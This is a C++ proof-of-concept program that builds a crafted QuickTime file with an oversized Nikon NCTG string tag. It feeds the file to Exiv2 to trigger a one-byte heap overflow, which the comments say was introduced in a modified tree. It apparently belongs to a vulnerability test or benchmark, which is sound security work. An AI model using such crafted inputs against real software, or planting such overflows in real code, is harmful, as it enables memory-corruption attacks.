/*
 * Proof-of-concept probe for the Exiv2 QuickTime/MOV metadata reader.
 *
 * Drives the public C++ API (Exiv2::ImageFactory::open(const byte*, size_t)
 * followed by Image::readMetadata()) with an in-contract, self-contained
 * QuickTime file embedded below. The file is a well-formed container:
 *   ftyp(M4V) -> udta -> NCTG (Nikon tags) -> one string tag entry.
 *
 * On the original maintenance batch this parses cleanly. On the modified
 * tree the Nikon NCTG string decoder writes one byte past the end of its
 * heap scratch buffer (CWE-787), which AddressSanitizer aborts on.
 *
 * Although named .c, this is compiled as C++ (it uses the C++ public API),
 * matching how Exiv2 consumers link against the library.
 */
#include <exiv2/exiv2.hpp>

#include <cstdint>
#include <cstdio>
#include <vector>

int main(void) {
  std::vector<uint8_t> data;

  auto be32 = [&](uint32_t v) {
    data.push_back((v >> 24) & 0xff);
    data.push_back((v >> 16) & 0xff);
    data.push_back((v >> 8) & 0xff);
    data.push_back(v & 0xff);
  };
  auto be16 = [&](uint16_t v) {
    data.push_back((v >> 8) & 0xff);
    data.push_back(v & 0xff);
  };
  auto raw = [&](const char* s, size_t n) {
    for (size_t i = 0; i < n; i++)
      data.push_back((uint8_t)s[i]);
  };

  /* ftyp atom (size 16): makes ImageFactory select the QuickTime reader */
  be32(16);
  raw("ftyp", 4);
  raw("M4V ", 4); /* major brand, known qTimeFileType */
  be32(0);        /* minor version */

  /* Build the NCTG payload: one Nikon tag, dataType=2 (string), len=200 */
  std::vector<uint8_t> nctg;
  {
    std::vector<uint8_t>& d = nctg;
    auto p32 = [&](uint32_t v) {
      d.push_back((v >> 24) & 0xff);
      d.push_back((v >> 16) & 0xff);
      d.push_back((v >> 8) & 0xff);
      d.push_back(v & 0xff);
    };
    auto p16 = [&](uint16_t v) {
      d.push_back((v >> 8) & 0xff);
      d.push_back(v & 0xff);
    };
    p32(0x00000001); /* TagID (not a special-cased id) */
    p16(2);          /* dataType = 2 => string entry */
    p16(200);        /* dataLength = 200 */
    for (int i = 0; i < 200; i++)
      d.push_back('A'); /* 200 bytes of payload */
  }

  /* NCTG atom = 8-byte header + payload */
  uint32_t nctgSize = (uint32_t)(8 + nctg.size());
  /* udta atom = 8-byte header + NCTG atom */
  uint32_t udtaSize = (uint32_t)(8 + nctgSize);

  be32(udtaSize);
  raw("udta", 4);
  be32(nctgSize);
  raw("NCTG", 4);
  for (uint8_t b : nctg)
    data.push_back(b);

  try {
    Exiv2::Image::UniquePtr image = Exiv2::ImageFactory::open(data.data(), data.size());
    image->readMetadata();
    (void)image;
  } catch (const Exiv2::Error& e) {
    std::fprintf(stderr, "exiv2 error (clean): %s\n", e.what());
    return 0;
  } catch (...) {
    std::fprintf(stderr, "non-exiv2 exception (clean)\n");
    return 0;
  }

  std::fprintf(stderr, "parsed without memory error\n");
  return 0;
}
